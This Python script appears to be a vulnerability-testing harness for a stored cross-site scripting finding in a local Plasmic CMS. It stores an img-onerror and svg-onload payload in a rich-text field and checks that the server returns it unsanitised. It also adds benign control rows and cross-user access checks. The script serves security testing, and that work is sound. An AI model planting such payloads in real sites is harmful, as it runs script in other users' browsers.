#!/usr/bin/env python3
"""P-001 server half: store XSS payloads in Plasmic CMS rich-text via CMSE API.
Control vs attack, persisted-state verified via API re-read + psql (done by caller).
Users: user1 (owner) creates content; user2 = cross-user control (must fail).
"""
import json, subprocess, sys, urllib.request, http.cookiejar, os

BASE = "http://localhost:3004"
PW = "!53kr3tz!"
WS_USER1 = "w5Pt8rbG9of23uHUMBVgMu"

PAYLOAD = '<p>hello</p><img src=x onerror="window.__xss=(window.__xss||[]).concat(\'img-onerror\')"><svg onload="window.__xss=(window.__xss||[]).concat(\'svg-onload\')"></svg>'
CONTROL = "<p>control <b>bold</b> paragraph</p>"

def session(email):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    csrf = json.loads(op.open(BASE + "/api/v1/auth/csrf").read())["csrf"]
    req = urllib.request.Request(BASE + "/api/v1/auth/login",
        data=json.dumps({"email": email, "password": PW}).encode(),
        headers={"Content-Type": "application/json", "x-csrf-token": csrf})
    r = json.loads(op.open(req).read())
    assert r.get("status") is True, f"login failed for {email}: {r}"
    csrf = json.loads(op.open(BASE + "/api/v1/auth/csrf").read())["csrf"]
    return op, csrf

def call(op, csrf, method, path, body=None, expect_fail=False):
    req = urllib.request.Request(BASE + path,
        data=json.dumps(body).encode() if body is not None else None,
        headers={"Content-Type": "application/json", "x-csrf-token": csrf}, method=method)
    try:
        with op.open(req) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def field(identifier, type_):
    return {"identifier": identifier, "name": "", "helperText": "", "required": False,
            "hidden": False, "localized": False, "unique": False, "type": type_,
            "defaultValueByLocale": {}}

def main():
    results = []
    op1, csrf1 = session("user@example.com")
    op2, csrf2 = session("user2@example.com")

    st, db = call(op1, csrf1, "POST", "/api/v1/cmse/databases",
                  {"name": "hunt-db", "workspaceId": WS_USER1})
    print(f"[setup] create database as user1 -> {st}")
    db_id = db.get("id") or db.get("database", {}).get("id")
    print("[setup] db =", json.dumps(db)[:300])
    assert db_id, "no database id"
    results.append(("setup-db", st == 200))

    st, tbl = call(op1, csrf1, "POST", f"/api/v1/cmse/databases/{db_id}/tables",
                   {"name": "Posts", "identifier": "posts",
                    "schema": {"fields": [field("title", "text"), field("body", "rich-text")]}})
    print(f"[setup] create table as user1 -> {st}: {json.dumps(tbl)[:200]}")
    table_id = tbl.get("id")
    assert table_id, "no table id"
    results.append(("setup-table", st == 200))

    # ATTACK row: payload in rich-text field, published data (not just draft)
    st, r = call(op1, csrf1, "POST", f"/api/v1/cmse/tables/{table_id}/rows",
                 {"rows": [{"identifier": "attack-row",
                            "data": {"": {"title": "attack", "body": PAYLOAD}}}]})
    print(f"[attack] create payload row -> {st}: {json.dumps(r)[:200]}")
    results.append(("attack-row-created", st == 200))

    # CONTROL row: benign rich text
    st, r = call(op1, csrf1, "POST", f"/api/v1/cmse/tables/{table_id}/rows",
                 {"rows": [{"identifier": "control-row",
                            "data": {"": {"title": "control", "body": CONTROL}}}]})
    print(f"[control] create benign row -> {st}")
    results.append(("control-row-created", st == 200))

    # Re-read via API: payload must come back verbatim (no server-side sanitisation)
    st, rows = call(op1, csrf1, "GET", f"/api/v1/cmse/tables/{table_id}/rows")
    by_ident = {r.get("identifier"): (r.get("data") or {}).get("", {})
                for r in rows.get("rows", [])}
    pv = by_ident.get("attack-row", {}).get("body") == PAYLOAD
    cv = by_ident.get("control-row", {}).get("body") == CONTROL
    print(f"[verify] list rows -> {st}, payload exact-match: {pv}, control exact-match: {cv}")
    results.append(("payload-verbatim-api", pv))
    results.append(("control-verbatim-api", cv))

    # Cross-user control: user2 must NOT be able to read or write user1's CMS
    st, r = call(op2, csrf2, "GET", f"/api/v1/cmse/tables/{table_id}/rows")
    print(f"[xuser] user2 list rows of user1 table -> {st} (expect 403/404)")
    results.append(("xuser-read-blocked", st in (400, 401, 403, 404)))
    st, r = call(op2, csrf2, "POST", f"/api/v1/cmse/tables/{table_id}/rows",
                 {"rows": [{"identifier": "evil", "data": {"": {"title": "x", "body": "x"}}}]})
    print(f"[xuser] user2 create row in user1 table -> {st} (expect 403/404)")
    results.append(("xuser-write-blocked", st in (400, 401, 403, 404)))

    print("\n== SUMMARY ==")
    ok = True
    for name, passed in results:
        print(f"  {'PASS' if passed else 'FAIL'}  {name}")
        ok = ok and passed
    print(f"db_id={db_id} table_id={table_id}")
    with open(os.path.join(os.path.dirname(__file__), "cms_ids.json"), "w") as f:
        json.dump({"db_id": db_id, "table_id": table_id, "payload": PAYLOAD, "control": CONTROL}, f)
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
